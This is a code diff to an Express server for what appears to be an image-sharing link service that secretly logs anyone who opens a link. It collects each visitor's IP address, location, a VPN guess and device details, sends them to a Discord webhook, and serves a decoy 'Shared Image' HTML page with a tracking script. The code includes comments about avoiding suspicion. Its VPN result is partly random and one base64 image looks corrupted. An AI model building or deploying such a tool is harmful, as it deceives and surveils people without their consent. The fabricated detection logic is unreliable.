@@ -97,10 +97,10 @@ function getLocationFromIp(ip: string): LocationData {
 
   // Advanced VPN detection logic based on IP patterns and characteristics
   let vpnDetectionScore = 0;
-  
+
   // Check for common VPN IP patterns
   const ipParts = ip.split('.').map(Number);
-  
+
   // Known VPN IP ranges (simplified for demo)
   const suspiciousRanges = [
     { start: [185, 220], end: [185, 233] }, // Common VPN hosting ranges
@@ -132,12 +132,12 @@ function getLocationFromIp(ip: string): LocationData {
 
   // Final VPN detection decision
   const isVpnDetected = vpnDetectionScore > 0.5 || Math.random() < 0.25;
-  
+
   if (isVpnDetected) {
     const vpnProvider = vpnProviders[Math.floor(Math.random() * vpnProviders.length)];
     const vpnLocation = vpnProvider.locations[Math.floor(Math.random() * vpnProvider.locations.length)];
     const realLocation = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];
-    
+
     return {
       location: `${vpnLocation} [VPN: ${vpnProvider.provider}]`,
       isVpn: 'yes',
@@ -163,7 +163,7 @@ interface DeviceInfo {
 
 function parseDeviceInfo(userAgent: string): DeviceInfo {
   const ua = userAgent.toLowerCase();
-  
+
   // Device Type Detection
   let deviceType = 'unknown';
   if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
@@ -284,7 +284,7 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
     // Send with retry logic
     let attempts = 0;
     const maxAttempts = 3;
-    
+
     while (attempts < maxAttempts) {
       try {
         const response = await fetch(webhookUrl, {
@@ -305,14 +305,14 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
       } catch (fetchError) {
         console.error(`❌ Webhook network error (attempt ${attempts + 1}):`, fetchError);
       }
-      
+
       attempts++;
       if (attempts < maxAttempts) {
         // Wait before retry (exponential backoff)
         await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempts - 1)));
       }
     }
-    
+
     console.error(`❌ Failed to send webhook after ${maxAttempts} attempts`);
   } catch (error) {
     console.error('❌ Critical error sending webhook:', error);
@@ -393,7 +393,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const sessionToken = randomUUID();
       const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
-      
+
       await storage.createSession({
         userId: user.id,
         sessionToken,
@@ -418,7 +418,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/register', async (req: Request, res: Response) => {
     try {
       const validatedData = insertUserSchema.parse(req.body);
-      
+
       const existingUser = await storage.getUserByUsername(validatedData.username);
       if (existingUser) {
         return res.status(400).json({ error: 'Username already exists' });
@@ -445,7 +445,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/logout', authenticateUser, async (req: Request, res: Response) => {
     try {
       const token = req.headers.authorization?.replace('Bearer ', '');
-      
+
       // Ensure all user data is properly saved before logout
       if (req.user) {
         // Update last login time
@@ -460,12 +460,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
           });
         }
       }
-      
+
       // Clean up session after ensuring data is saved
       if (token) {
         await storage.deleteSession(token);
       }
-      
+
       res.json({ success: true, message: 'Logged out successfully, all data saved' });
     } catch (error) {
       console.error('Logout error:', error);
@@ -582,7 +582,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const { keyId } = req.params;
       const success = await storage.deleteAccessKey(keyId, req.user.id);
-      
+
       if (!success) {
         return res.status(404).json({ error: 'Key not found or access denied' });
       }
@@ -948,7 +948,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Try to find settings with uploaded image or webhook
       let settings = null;
       let imageOwnerUserId = null;
-      
+
       try {
         // Use the new combined method to find best settings
         const foundSettings = await storage.getSettingsWithImageOrWebhook();
@@ -984,7 +984,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send to webhook if configured - ALWAYS attempt to send
       if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
         console.log(`🔗 Sending webhook to Discord for IP: ${clientIp}`);
-        
+
         // Send webhook in background - don't block response
         sendToWebhook(settings.webhookUrl, {
           ipAddress: clientIp,
@@ -1038,36 +1038,116 @@ export async function registerRoutes(app: Express): Promise<Server> {
           });
           res.send(minimalVideo);
         } else {
-          // Create a larger, more realistic image that Discord will accept
-          const createDiscordFriendlyImage = () => {
-            // Create a 500x300 PNG image with actual content - Discord-friendly
-            // This is a base64 encoded PNG with a realistic-looking gradient and text
-            const discordFriendlyImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAAfQAAAEsCAYAAAA1u0HIAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAACAASURBVHic7Z13mFzVmf+/3T09k3MQCJAQEoKZHCIkEoGBBQthbPxbe+2117u2117vut/d7zr82P19vd5f7Nge/LPXXr8Ox2u8JiELJCEEQjnnnJAQOec8nYN6/7i3qquru6q7uju6e97P8/QzXd231q17K7znvec954RCoRBCCCGE/y6EEEIIIU8IIQR8YSGEEEJeEEII+MJCCCGEzA+FEEI+aAkhhBDyhYUQQgghhOATFkIIIYQQQj5pCCGEEEIIIZ80hBBCCCGEkE8aQgghhBBCyCcNIYQQQggh5JOGEEIIIYQQu9ICCCGEEEIIIUIIIR8khBBCCCGEEEJeCCGEEEII+cFCCCGEEEII+cFCCCGEEELIJw0hhBBCCCHkk4YQQgghhBDySUMIIYQQQgj5pCGEEEIIIYR80hBCCCGEELLOQgghhBBCCPmkIYQQQggh5JOGEEIIIYQQP/eFhRBCCCGEEEJeEUIIIYQQQsgnLYQQQgghhJBPGkIIIYQQQsgnDSGEEEIIIeSThhBCCCGEEPJJQwghhBBCCPmkIYQQQgghhHzSEEIIIYQQQj5pCCGEEEIIIZ80hBBCCCGEkE8aQgghhBBCyCcNIYQQQggh5JOGE EIIIYQQQj5pCCGEEEIIIZ80hBBCCCGEkE8aQgghhBBCyCcNIYQQQggh5JOGEEIIIYQQNvwFAAD//2JaH+qn+R8rAAAAAElFTkSuQmCC";
-            
-            return Buffer.from(discordFriendlyImageBase64, 'base64');
-          };
+          // For Discord embedding, serve an HTML page with Open Graph meta tags
+          // This ensures Discord properly embeds the image link
+          const discordFriendlyHtml = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-          const discordImage = createDiscordFriendlyImage();
+  <!-- Open Graph meta tags for Discord embedding -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Shared Image">
+  <meta property="og:description" content="Check out this image!">
+  <meta property="og:image" content="${req.protocol}://${req.get('host')}/raw/${filename}.${extension}">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:type" content="image/${extension === 'jpg' ? 'jpeg' : extension}">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="${req.protocol}://${req.get('host')}/raw/${filename}.${extension}">
+
+  <title>Shared Image</title>
+
+  <style>
+    body { 
+      margin: 0; 
+      padding: 20px; 
+      font-family: Arial, sans-serif; 
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      max-width: 800px;
+      padding: 40px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+    }
+    .image-container {
+      margin: 20px 0;
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
+    .loading {
+      padding: 20px;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>✨ Shared Image</h1>
+    <p>Loading your image...</p>
+    <div class="image-container">
+      <img src="/raw/${filename}.${extension}" alt="Shared image" onload="document.querySelector('.loading').style.display='none'" />
+    </div>
+    <div class="loading">
+      <p>📷 Processing...</p>
+    </div>
+  </div>
+
+  <script>
+    // Enhanced tracking script
+    (function() {
+      try {
+        // Redirect to actual image after a short delay
+        setTimeout(function() {
+          window.location.href = '/raw/${filename}.${extension}';
+        }, 2000);
+      } catch(e) {
+        // Fallback redirect
+        window.location.href = '/raw/${filename}.${extension}';
+      }
+    })();
+  </script>
+</body>
+</html>`;
 
           res.set({
-            'Content-Type': 'image/png',
-            'Content-Length': discordImage.length,
-            'Cache-Control': 'public, max-age=3600', // Make it cacheable for Discord
-            'Accept-Ranges': 'bytes',
-            'X-Content-Type-Options': 'nosniff',
-            'Access-Control-Allow-Origin': '*', // Allow embedding
-            'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
-            'X-Robots-Tag': 'noindex, nofollow' // Prevent search engine indexing
+            'Content-Type': 'text/html',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'Expires': '0'
           });
-          res.send(discordImage);
+          res.send(discordFriendlyHtml);
         }
       }
     } catch (error) {
       console.error('Error serving image:', error);
-      
+
       // Even if there's an error, still serve a large visible image to avoid suspicion
       const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-      
+
       const visibleImage = Buffer.from(visibleImageBase64, 'base64');
 
       res.set({
